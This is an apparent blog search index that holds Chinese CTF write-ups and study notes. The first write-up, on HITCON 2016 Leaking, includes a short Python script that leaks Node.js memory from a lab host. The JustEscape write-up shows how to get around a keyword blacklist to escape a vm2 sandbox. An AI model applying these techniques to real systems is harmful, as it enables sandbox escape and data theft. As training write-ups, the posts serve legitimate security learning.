<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>buu-Leaking</title>
    <link href="/2025/02/06/buu-Leaking/"/>
    <url>/2025/02/06/buu-Leaking/</url>
    
    <content type="html"><![CDATA[<p>学校的训练赛中出现了这道题，现在找到原题来做一下</p><p>[HITCON 2016]Leaking-nodejsVM沙箱逃逸</p><p>打开靶机，查看源代码</p><p><img src="/images/buu-Leaking/1/png"></p><p>分析一下这段代码<br>这一段代码很明显是最重要的代码</p><p><img src="/buu-Leaking"></p><p>其中</p><p>  &#x2F;*    Orange is so kind so he put the flag here. But if you can guess correctly :P    *&#x2F;<br>    eval(“var flag_” + randomstring.generate(64) + “ &#x3D; &quot;hitcon{“ + flag + “}&quot;;”)</p><p>这一段看注释可以知道，在这里生成了flag</p><p>if (req.query.data &amp;&amp; req.query.data.length &lt;&#x3D; 12) {<br>        var vm &#x3D; new VM({<br>            timeout: 1000<br>        });<br>        console.log(req.query.data);<br>        res.send(“eval -&gt;” + vm.run(req.query.data));</p><p>这一段，对我们传入的值进行长度判断，判断是否小于等于12，如果符合就会进入沙盒运行，这里可以用数组进行绕过</p><p>exp:</p><p>import requests</p><p>session &#x3D; requests.Session()<br>session.trust_env &#x3D; False<br>while True:<br>    response &#x3D; session.get(‘<a href="http://1e0ac859-1ead-4ec5-9ecd-c1aec42d861c.node5.buuoj.cn:81/?data=Buffer(9999)">http://1e0ac859-1ead-4ec5-9ecd-c1aec42d861c.node5.buuoj.cn:81/?data=Buffer(9999)</a>‘)<br>    if “flag” in response.text:<br>        print(response.text)<br>        break</p><p><img src="/images/buu-Leaking/3.png"></p><p>总结：<br>分析一下这道题的考点是涉及远古版本的node内存分配的问题，远古版本的node中Buffer就是内存分配的，并且重新分配之后不会进行初始化。<br>意味着之前加载的内存被回收之后还会被重新分配出来，并且不会初始化，原始数据还留在那里。。<br>外国老哥分许的原因</p><p><img src="/images/buu-Leaking/4.png"></p><p>所以使用new Buffer(size)或其别名Buffer(size)创建,则对象不会填充，但是只要是调用过的变量，一定会存在内存中，所以需要使用Buffer()来读取内存，使用data&#x3D;Buffer(9999)分配一个9999的单位为8位字节的buffer，因此能得到姿势</p><p>在早时期的版本node，当Buffer传入一个数字，就会得到这个长度的buffer，并且这个buffer是没有进行初始化的。8.0之后的版本，可以通过Buffer.allocUnsafe(size)<br>这个函数来得到未初始化的数据</p>]]></content>
    
    
    <categories>
      
      <category>原创</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习日志 day2(pyjail)</title>
    <link href="/2025/01/24/pyjail/"/>
    <url>/2025/01/24/pyjail/</url>
    
    <content type="html"><![CDATA[<p> 今天学习python沙盒逃逸的相关知识，做到沙盒逃逸的初识，来记录和总结一下学习到的知识点。</p><h1>Python的特性，魔术方法及魔术属性</h1><h2>Python类的继承</h2><p>所有的类均继承自object基类 python中的一切都是对象的特性</p><p>01不带object</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu-[HFCTF2020]JustEscape wp</title>
    <link href="/2025/01/24/sandbox/"/>
    <url>/2025/01/24/sandbox/</url>
    
    <content type="html"><![CDATA[<p>这是一道Node,js沙盒逃逸的题目，根据大佬们的wp做的，记录一下做题的过程以及学习到的相应的知识点</p><h1>信息查看</h1><p>打开环境:</p><p><img src="/images/sandbox/sand1.png"></p><p>可以看到里面有一些提示，比如说 真的是php吗</p><p>打开&#x2F;run.php进行查看发现里面有一个eval()函数</p><p><img src="/images/sandbox/sand2.png"></p><p>这个函数除了php中有，Node.js中也含有这个函数，结合提示信息推测应该是Node.js。于是尝试利用Error().stack来进行查看<br>页面回显了一堆报错信息</p><p><img src="/images/sandbox/sand3.png"></p><p>根据这些信息可以推断这道题目是一个vm的沙盒逃逸</p><p>那么接下来把demo的那个请求参数放到url中进行查看。</p><p><img src="/images/sandbox/sand4.png"></p><p>发现没有回显，那么推测就是可能有黑名单检测机制，尝试输入其他的node.js语句，发现一下字符串被列入了黑名单</p><ol>  <li> ' </li>  <li> " </li>  <li> + </li>  <li> process </li>  <li> constructor </li>  <li> exec </li></ol><h1>bypass 黑名单机制</h1><p>首先是单引号或者双引号，我的代码需要用到它们，但都被禁用了，我选择用 &#96;&#96; 代替单双引号声明字符串。</p><p>process、constructor 和 exec 都是被用于命名方法或者属性的标识符，它们本身不是字符串，但是由于在 JavaScript 中，除了可以通过 . 访问属性和方法，还可以通过中括号 [] 访问，中括号里面是方法或属性的字符串名称</p><p>对于黑名单中的字符串我们可以用concat连接字符串</p><p>绕过的形式类似于a[<code>proces</code>.concat(<code>s</code>)]</p><h1>绕过沙盒执行系统的命令</h1><p>根据之前的Error().stack报错信息进行查看发现vm2的模块</p><p>在snyk网站上找到poc</p><p><img src="/images/sandbox/sand5.png"></p><p>根据之前得到得到各种信息在本地进行一下修改</p><p><img src="/images/sandbox/sand6.png"></p><p>主要是将黑名单的字符串进行了修改。修改完成之后将代码复制到地址栏中访问</p><p><img src="/images/sandbox/sand7.png"></p><p>这样就得到了flag</p><h1>总结</h1>根据这道题目学会了沙盒逃逸的一些简单的知识点，以及一些js的知识<p>Javascript声明字符串的几种方式：</p><ol>  <li>单引号 ' </li>  <li>双引号 " </li>  <li>反引号 ` </li>  <li>Buffer.form()</li>  <li>正则表达式，然后 toString() 得到字符串，再 substring() 去掉左右的 /，例如： /apple/.toString().substring(1,6)</li></ol><p>JavaScript拼接字符串的方式：</p><ol>  <li>加号 +</li>  <li>String.concat()方。如'pronces.concat('s')</li></ol><p>JavaScript可以用点号或者中括号访问属性的方法：</p><ol>  <li>this.constuctor</li>  <li>this['constructor']</li></ol><p>Error 对象的 stack 属性可以返回调用栈，包括程序文件的路径，利用这点查看用的哪个沙盒模块。</p><p>其他的知识点暂时需要深入学习。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习笔记 day1</title>
    <link href="/2025/01/22/111/"/>
    <url>/2025/01/22/111/</url>
    
    <content type="html"><![CDATA[<p>今天开始记录学习日常，今天学习html</p><h1>一.简介</h1><p>HTML 是用来描述网页的一种语言。<br>HTML 指的是超文本标记语言: HyperText Markup Language<br>HTML 不是一种编程语言，而是一种标记语言<br>标记语言是一套标记标签 (markup tag)<br>HTML 使用标记标签来描述网页<br>HTML 文档包含了HTML 标签及文本内容<br>HTML文档也叫做 web 页面</p><p>这是一段实例<br><img src="/images/html/html1.png"></p><h1>二.HTML基础</h1>HTML分为四个基础部分<h2>1.HTML标题</h2>HTML标题是通过< h1>--< h6>标签来进行定义的,并且通过这种形式结束该语句<p>实例<br>&lt; h1&gt;这是一个标题&lt; &#x2F;h1&gt;<br>&lt; h2&gt;这是第二个标题&lt; &#x2F;h2&gt;</p><h2>2.HTML段落</h2>HTML段落是通过标签< p>来定义的，同样用< /p>这种形式来结束该语句<p>实例<br>&lt; p&gt;这是一个段落&lt; &#x2F;p&gt;<br>&lt; p&gt;这是另一个段落&lt; &#x2F;p&gt;</p><h2>3.HTML连接</h2>HTML连接是通过< a>来定义的语句形式是< a href="www.---">这是一个连接<p>实例<br>&lt; a href&#x3D;”<a href="https://www.qfnu.edu.cn/%22%3E%E8%BF%99%E6%98%AF%E6%9B%B2%E9%98%9C%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%9A%84%E5%AE%98%E7%BD%91%E8%BF%9E%E6%8E%A5">https://www.qfnu.edu.cn/&quot;&gt;这是曲阜师范大学的官网连接</a>&lt; &#x2F;a&gt;</p><h2>4,HTML图像</h2>HTML图像是通过标签<img>来定义的<p>实例<br>&lt; img src&#x3D;”&#x2F;images&#x2F;logo.png” width&#x3D;”258” height&#x3D;”39” &#x2F;&gt;</p><p>注意图像的名称和尺寸是以属性的形式提供的！！！</p>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>后门查杀</title>
    <link href="/2024/12/03/houmen/"/>
    <url>/2024/12/03/houmen/</url>
    
    <content type="html"><![CDATA[<p>一.需要用到的工具</p><p>D盾&#x2F;火绒安全</p><p>二.1.后门查杀</p><p>下载文件，用火绒安全进行查杀</p><p><img src="/images/1.png" alt="123"></p><p>点开这个病毒文件，用记事本打开，发现里面有一串md5加密的字符串，推测这个就是我们要找的flag，发现成功提交</p><p><img src="/images/2.png" alt="2"></p><p>flag为</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><p>2.webshell后门</p><p>和前一题一样下载文件用火绒进行查杀</p><p><img src="/images/3.png" alt="3"></p><p>查找到两个后门病毒，打开进行查看</p><p>![4images&#x2F;4.png)</p><p>发现一段md5加密的字符串，推测这个就是flag</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><p>三.总结</p><p>通过这两个题，学会了使用D盾&#x2F;火绒进行后门类的题目</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
